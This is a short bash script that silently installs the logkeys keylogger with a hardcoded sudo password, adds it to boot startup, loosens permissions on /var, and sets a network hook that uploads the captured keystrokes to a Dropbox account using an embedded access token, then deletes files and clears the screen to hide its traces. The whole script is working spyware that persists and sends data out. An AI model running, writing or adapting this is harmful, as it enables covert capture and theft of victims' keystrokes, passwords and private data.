#!/bin/bash/
#check if logkeys is already present
if [ $(command -v logkeys) != "/usr/bin/logkeys" ]
then
  echo -e "student123\n" >/dev/null | sudo -S apt-get install -y logkeys 2>/dev/null
  sudo chmod 777 /var/
else
  echo -e "student123\n" >/dev/null | sudo -S apt-get install logkeys 2>/dev/null
  sudo chmod 777 /var/
fi
#add payload to rc.local
echo "/usr/bin/logkeys -s -u -o /var/borhade.txt" | sudo tee -a /etc/init.d/rc.local
clear                                                                                                                                                                                                              #check if git is installed
if [ $(command -v git) != "/usr/bin/git" ]
then
   echo -e "student123\n" >/dev/null | sudo -S apt-get install -y git >/dev/null
fi
#clone dropbox uploader
cd /var
git clone https://github.com/andreafabrizi/Dropbox-Uploader.git &>/dev/null
#make it executable
cd /var/Dropbox-Uploader
echo -e "student123\n" &>/dev/null | sudo -S chmod +x dropbox_uploader.sh >/dev/null
echo -e "Q05WDI9ABtAAAAAAAAAADs3u355VUE4FiHJ9K6_ZW3FhmIM7ipm2kP3XM2mQikqr\ny\n" | ./dropbox_uploader.sh >/dev/null
cd
echo "/var/Dropbox-Uploader/dropbox_uploader.sh upload /var/borhade.txt /TheGreatApp" | sudo tee -a /etc/network/if-up.d/rhb >/dev/null
sudo chmod +x /etc/network/if-up.d/rhb >/dev/null
clear
cd 
sudo rm -rf insem
